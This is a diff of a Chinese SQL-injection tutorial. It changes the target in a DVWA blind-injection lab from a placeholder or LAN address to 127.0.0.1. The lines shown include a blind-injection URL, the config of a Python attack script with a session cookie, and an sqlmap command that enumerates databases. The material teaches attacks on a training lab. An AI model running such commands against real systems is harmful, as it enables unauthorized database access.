@@ -39,7 +39,7 @@ if ($num > 0) {
 在 URL 中提交：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit
+http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit
 ```
 
 页面返回 `User ID exists in the database.`。
@@ -291,7 +291,7 @@ import requests
 import time
 
 # ========== 配置区 ==========
-TARGET = "http://192.168.153.131:8890/vulnerabilities/sqli_blind/"
+TARGET = "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
 COOKIES = {
     "PHPSESSID": "efb7qv5n5n77v4jqp6afhlh05n",
     "security": "low"
@@ -416,7 +416,7 @@ if __name__ == "__main__":
 手工盲注效率较低，可使用 sqlmap 自动化：
 
 ```bash
-sqlmap -u "http://靶机IP/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=你的会话ID; security=low" \
   --batch --dbs
 ```
